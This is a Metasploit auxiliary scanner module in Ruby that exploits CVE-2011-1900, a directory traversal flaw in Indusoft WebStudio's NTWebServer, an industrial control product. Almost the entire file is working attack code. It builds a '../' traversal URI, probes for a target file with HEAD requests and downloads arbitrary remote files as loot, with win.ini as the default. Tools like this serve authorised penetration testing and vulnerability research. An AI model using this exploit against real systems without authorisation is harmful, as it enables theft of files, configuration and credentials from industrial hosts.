##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'Indusoft WebStudio NTWebServer Remote File Access',
      'Description'  =>  %q{
          This module exploits a directory traversal vulnerability in Indusoft WebStudio.
        The vulnerability exists in the NTWebServer component and allows to read arbitrary
        remote files with the privileges of the NTWebServer process. The module has been
        tested successfully on Indusoft WebStudio 6.1 SP6.
      },
      'References'   =>
        [
          [ 'CVE', '2011-1900' ],
          [ 'OSVDB', '73413' ],
          [ 'BID', '47842' ],
          [ 'URL', 'http://www.indusoft.com/hotfixes/hotfixes.php' ]
        ],
      'Author'       =>
        [
          'Unknown', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'      => MSF_LICENSE
    )

    register_options(
    [
      OptString.new('RFILE', [true, 'Remote File', '/windows\\win.ini']),
      OptInt.new('DEPTH', [true, 'Traversal depth', 3])
    ])

    register_autofilter_ports([ 80 ])
    deregister_options('RHOST')
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri'     => "/",
      'method'  => 'GET'
    })

    if not res
      print_error("#{rhost}:#{rport} - Unable to connect")
      return
    end

    accessfile(ip)
  end

  def accessfile(rhost)

    traversal = "../" * datastore['DEPTH']
    rfile = ""

    if datastore['RFILE'][0] == "/"
      rfile = datastore['RFILE'][1..datastore['RFILE'].length-1]
    else
      rfile = datastore['RFILE']
    end

    print_status("#{rhost}:#{rport} - Checking if file exists...")

    res = send_request_cgi({
      'uri'      => "/#{traversal}#{rfile}",
      'method'   => 'HEAD'
    })

    if res and res.code == 200 and res.message =~ /File Exists/
      print_good("#{rhost}:#{rport} - The file exists")
    else
      print_error("#{rhost}:#{rport} - The file doesn't exist")
      return
    end

    print_status("#{rhost}:#{rport} - Retrieving remote file...")

    res = send_request_cgi({
      'uri'      => "/#{traversal}#{rfile}",
      'method'   => 'GET'
    })

    if res and res.code == 200 and res.message =~ /Sending file/
      loot = res.body
      if not loot or loot.empty?
        print_status("#{rhost}:#{rport} - Retrieved empty file")
        return
      end
      f = ::File.basename(datastore['RFILE'])
      path = store_loot('indusoft.webstudio.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
      print_good("#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}")
      return
    end

    print_error("#{rhost}:#{rport} - Failed to retrieve file")
  end
end

